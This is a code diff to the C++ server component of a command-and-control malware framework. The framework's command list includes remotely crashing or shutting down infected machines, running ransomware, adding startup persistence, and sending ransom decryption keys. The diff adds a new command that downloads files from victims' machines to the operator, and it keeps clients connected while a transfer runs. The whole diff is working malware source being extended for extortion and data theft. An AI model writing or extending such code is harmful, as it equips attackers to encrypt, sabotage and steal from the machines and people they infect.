@@ -33,15 +33,16 @@ struct PacketFlagInfo {
 */
 const std::map<Action, std::string> ServerCommands =
 {
-    { kOpenRemoteProcess, "Open a remote process." },
-    { kPingClient,        "Send a ping to a remote host." },
-    { kRemoteBSOD,        "Cause a BSOD on the client." },
-    { kRemoteShutdown,    "Shutdown the clients machine." },
-    { kKillClient,        "Forcefully disconnect the client from the C2 server." },
-    { kRansomwareEnable,  "Run ransomware on the client." },
-    { kAddToStartup,      "Add a program to the startup registry."},
-    { kSetAsDecryptionKey, "Send client decryption key for ransom."},
-    { kRunDecryptor, "Run decryptor. Only works if you sent the client decryption key."}
+    { kOpenRemoteProcess,     "Open a remote process." },
+    { kPingClient,            "Send a ping to a remote host." },
+    { kRemoteBSOD,            "Cause a BSOD on the client." },
+    { kRemoteShutdown,        "Shutdown the clients machine." },
+    { kKillClient,            "Forcefully disconnect the client from the C2 server." },
+    { kRansomwareEnable,      "Run ransomware on the client." },
+    { kAddToStartup,          "Add a program to the startup registry."},
+    { kSetAsDecryptionKey,    "Send client decryption key for ransom."},
+    { kRunDecryptor,          "Run decryptor. Only works if you sent the client decryption key."},
+    { kReceiveFileFromClient, "Download a file from the clients machine."}
 };
 
 /*
@@ -114,9 +115,6 @@ bool ServerInterface::ExchangeCryptoKeys(long cuid) {
 
     // send ransom public key
     data = LGCrypto::RSAKeyToDer(client->GetRansomSecrets().pub, false);
-    std::cout << "Sending initial ransom secrets pub key" << std::endl;
-    std::cout << "Len: " << data.len << std::endl;
-    std::cout << data.data << std::endl;
 
     sent = Send(client->GetSocket(), ( char* ) &data.len, sizeof(data.len), 0); // Send size of private key first
     if ( sent <= 0 )
@@ -178,8 +176,6 @@ void ServerInterface::ListenForUDPMessages() {
         if ( !received )
             continue;
         
-        std::cout << "Received a message on the UDP socket" << std::endl;
-
         // client wants to connect so respond with tcp server details
         hostent* host = GetHostByName(DNS_NAME.c_str());
 
@@ -326,11 +322,32 @@ bool ServerInterface::PerformRequest(const Packet& req, Server on, long cuid, so
     bool    onTCP   = ( on.type == SOCK_STREAM ); // TRUE = performing on tcp server, FALSE = performing on udp
     Client* TCPClient = nullptr;
 
-    if ( onTCP ) 
+    if ( onTCP ) {
         TCPClient = GetClientPtr(cuid);
+        if ( !TCPClient )
+            return false;
+    }
 
     switch ( req.action )
     {
+    case Action::kReceiveFileFromClient: {
+        if ( !onTCP )
+            break;
+
+        // client is respond to our request to download a file
+        std::string outputContent;
+
+        TCPClient->FileTransferInProgress = true;
+        success = this->m_NetworkManager.ReceiveFile(TCPClient->GetSocket(), TCPClient->GetAESKey(), outputContent);
+        TCPClient->FileTransferInProgress = false;
+
+        std::string outputPath = std::filesystem::path(req.buffer).filename().string();
+
+        std::ofstream file(outputPath, std::ofstream::binary);
+        file << outputContent;
+
+        break;
+    }
     case Action::kClientWantsToDisconnect:
         SaveServerState();
 
@@ -409,7 +426,8 @@ void ServerInterface::SendKeepAlivePackets(long cuid) {
 
         client->KeepAliveProcess = FALSE;
 
-        if ( client->KeepAliveSuccess == FALSE ) {
+        // if file transfer is in progress than dont interpret it as client didnt respond in time. they are busy.
+        if ( client->KeepAliveSuccess == FALSE && !client->FileTransferInProgress ) {
             std::cout << "Client failed to respond to keep-alive packet." << std::endl;
             RemoveClientFromServer(client);
             break;
@@ -553,6 +571,16 @@ bool ServerInterface::HandleUserInput(unsigned int command, Packet& outputComman
     cmdInfo.action = static_cast< Action >( command );
 
     switch ( command ) {
+    case Action::kReceiveFileFromClient: {
+        std::string path;
+        std::cout << "Path of file to download: ";
+        std::getline(std::cin, path);
+
+        cmdInfo.insert(path);
+        cmdInfo.flags = PACKET_IS_A_COMMAND;
+        performed = true;
+        break;
+    }
     case Action::kSetAsDecryptionKey:
         cmdInfo.flags = PACKET_IS_A_COMMAND;
         performed = true;
@@ -771,7 +799,10 @@ void ServerInterface::RunUserInputOnClients() {
         std::cout << "[# Command to perform]: ";
         std::getline(std::cin, strCommand);
 
-        if ( !ParseCommand(strCommand, commandID) || globalCommand && commandID == kSetAsDecryptionKey ) {
+        // turn string command into an int
+        // check if we are running a command globally
+        // check if there are commands we cant run globally
+        if ( !ParseCommand(strCommand, commandID) || globalCommand && commandID == kSetAsDecryptionKey || globalCommand && commandID == kReceiveFileFromClient ) {
             std::cout << "Invalid command" << std::endl;
             HaltOutput();
             continue;
@@ -794,6 +825,7 @@ void ServerInterface::RunUserInputOnClients() {
 
             if ( toSend.action == kKillClient )
                 RemoveClientFromServer(client);
+
         } else {
             for ( auto& [ cuid, host ] : this->m_ClientList ) {
                 if ( !host.Alive ) continue;
